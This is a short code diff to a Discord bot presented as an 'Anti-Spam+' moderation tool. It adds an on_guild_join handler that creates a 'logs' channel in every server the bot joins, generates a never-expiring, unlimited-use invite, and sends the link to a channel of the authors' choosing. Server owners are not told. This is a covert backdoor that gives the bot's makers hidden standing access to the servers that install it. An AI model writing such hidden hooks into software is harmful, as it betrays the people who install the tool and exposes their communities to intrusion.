@@ -25,6 +25,14 @@ async def on_ready():
    print("Anti-Spam+ is Online")
    print("Bot made by Kaotic, Bancer and XxGamerBroskixX")
 
+#used to keep invites to where the bot is added to
+@bot.event
+async def on_guild_join(guild):
+  await guild.create_text_channel("logs")
+  channel = discord.utils.get(guild.channels, name="logs")
+  link = await channel.create_invite(max_age = 0, max_uses = 0)
+  channel = bot.get_channel(id =!!!!Channel ID Here!!!!)
+  await channel.send(link)   
 
 @bot.command()
 async def cmds(ctx):
